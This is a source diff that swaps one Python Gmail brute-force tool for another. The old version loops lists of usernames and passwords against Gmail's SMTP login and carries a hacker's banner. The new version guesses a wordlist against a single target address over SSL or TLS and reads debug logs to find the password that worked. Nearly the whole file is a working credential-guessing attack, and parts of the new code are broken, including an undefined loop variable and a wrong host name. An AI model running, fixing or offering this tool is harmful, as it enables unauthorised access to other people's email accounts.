@@ -1,79 +1,136 @@
-#!/usr/bin/python
-from __future__ import absolute_import
-from __future__ import print_function
-from six.moves import input
-import smtplib
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
 
-class GmailBruteForce():
-    def __init__(self):
-        self.accounts = []
-        self.passwords = []
-        self.init_smtplib()
+from smtplib import SMTP
+from smtplib import SMTP_SSL
+from smtplib import SMTPAuthenticationError
+import string
+import sys # redirect stdout & stderr to a log file
+import re # search pattern
 
-    def get_acc_list(self,path):
-        file = open(path, 'r',encoding='utf8').read().splitlines()
-        for line in file:
-            self.accounts.append(line)
-
-    def get_pass_list(self,path):
-        file = open(path, 'r',encoding='utf8').read().splitlines()
-        for line in file:
-            self.passwords.append(line)
-
-    def init_smtplib(self):
-        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
-        self.smtp.starttls()
-        self.smtp.ehlo()
+def trial_without_ssl(mail_user, mail_pass): 
+    print("[+] trial_without_ssl function is running...")
+    SMTP = SMTP("smtp.google.com", 587)
+    SMTP.set_debuglevel(2)
+    SMTP.ehlo()
+    SMTP.starttls()
     
-    def try_gmail(self):
+    # doesnt have to manually close file
+    with open(mail_pass, 'r') as f:
+        file_contents = f.read()
+    
+    words = file_contents.split(' ')
+     
+    for password in opf:
+        try:
+            SMTP.login(mail_user, password)
+            print("Founded with easyway")
+            print("password for "+ mail_user + " is " + password)
+            return True
+        except SMTPAuthenticationError:
+            print(" Username and " + password + " not accepted.")
+    SMTP.close()
 
-        for user in self.accounts:
-            for password in self.passwords:
-                try:
-                    self.smtp.login(user,password)
-                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
-                    self.smtp.quit()
-                    self.init_smtplib()
-                    break;
-                except smtplib.SMTPAuthenticationError:
-                    # print("\033[1;31msorry \033[1;m")
-                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
+def trial_with_ssl(mail_user, mail_pass):
+    index_of_pass = 0
+    count_err = 0
+    count_pss = 1
+    
+    print("[+] trial_with_ssl function is running...")
+    server_ssl = SMTP_SSL("smtp.gmail.com", 465)
+    server_ssl.set_debuglevel(2)
+    server_ssl.ehlo()  # optional, called by login()
 
-print('''
-	==================================
-	|      [Gmail] ==> 3             |
-	|--------------------------------|
-	| snapchat: flaah999             |
-	| CoDeD By TA Hacker (@0xfff0800)|
-	|--------------------------------|
-	''')
+    #### doesnt have to manually close file #######################
+    with open(mail_pass, 'r') as f:
+        file_contents = f.read()
+        
+    words = file_contents.split(' ')
+    
+    sys.stdout = open('ssl_dbg_out', 'w')    
+    sys.stderr = open('ssl_dbg_err', 'w')
 
-instance = GmailBruteForce()
+    for password in words:
+        try:
+            server_ssl.login(mail_user, password)
+            print("Founded with easyway")
+            print("password for " + mail_user + " is " + password)
+        except SMTPAuthenticationError:
+            print(password)
+            
+    server_ssl.close()
+    
+    sys.stdout.close()  # close ssl_dbg_out
+    sys.stderr.close()  # close ssl_dbg_err
+    
+    sys.stdout = sys.__stdout__
+    sys.stderr = sys.__stderr__
+    
+    ####              differences between                 #####
+    ####          pieces of error in debug log            #####
+    ####            and pieces of passwords               #####
+    with open('ssl_dbg_err') as f:
+        for line in f:
+            count_err += line.count("Username")
+        
+    with open('passwfile') as f:
+        for line in f:
+            count_pss += line.count(" ")
+    
+    count_pss *= 4
+    if count_err >= count_pss:
+        print("Pass Not Found") 
+    elif count_err < count_pss:
+        print("Founded with hardway")   
+    else:
+        print("-*-")
+        
+    # 1 False Password = 11 line of err
+    # 1st line of specific - 2 = false passwords
+    # if 1st line of specific - 2 <= 0 
+    # password is 1st pass
+    # password is (false passwords + 1)st pass
+    
+    specifics = []
+    linenum = 0
+    pattern = re.compile("specific", re.IGNORECASE) # Compile a case-insensitive regex
+    with open ('ssl_dbg_err', 'rt') as myfile:    
+        for line in myfile:
+            linenum += 1
+            if pattern.search(line) != None: # If a match is found 
+                specifics.append((linenum, line.rstrip('\n')))
+    for err in specifics: # Iterate over the list of tuples
+        index_of_pass = err[0]
+        index_of_pass /= 11
+        break
+    
+    index_of_pass = int(index_of_pass)              # list indices must be integers
+                                                    # or slices, not float
+        
+    passlines = []                                  # Declare an empty list.
+    with open ('ssl_dbg_out', 'rt') as myfile:      # Open lorem.txt for reading text.
+        for passline in myfile:                     # For each line in the file,
+            passlines.append(passline.rstrip('\n')) # strip newline and add to list.
+    
+    print(passlines[index_of_pass])
+        
+# ----------------------------------------------------------------------------------- #
+#                                 MAIN FUNCTION                                       #
+# ----------------------------------------------------------------------------------- #
 
-do = input('''
-		Choose any number ?
-		1 - Email file
-		2 - target email
-		
-		==> ''')
-
-if do == '1':
-    user = input("List Of Usernames => ")
-    passfile = input("List Of Passwords => ")
-
-    instance.get_acc_list(user)
-    instance.get_pass_list(passfile)
-    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-    instance.try_gmail()
-   
-############
-if do == '2':
-    user = input("email : ")
-    senha = input("passlist : ")
-    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-    instance.accounts.append(user)
-    instance.get_pass_list(senha)
-
-    instance.try_gmail()
+def main():
+    print("TLS protocol is not working !!!")
+    print("Type 'ssl' for the protocol.")
+    mail_user = str(input("E-mail: "))
+    mail_pass = str(input("Wordlist: "))
+    
+    mail_ssl = "ssl"
+    mail_ssl = str(input("Protocol: "))
+    
+    if mail_ssl == "ssl":
+        trial_with_ssl(mail_user, mail_pass)
+    elif mail_ssl == "tls":
+        trial_without_ssl(mail_user, mail_pass)
+          
+if __name__ == "__main__":
+  main()
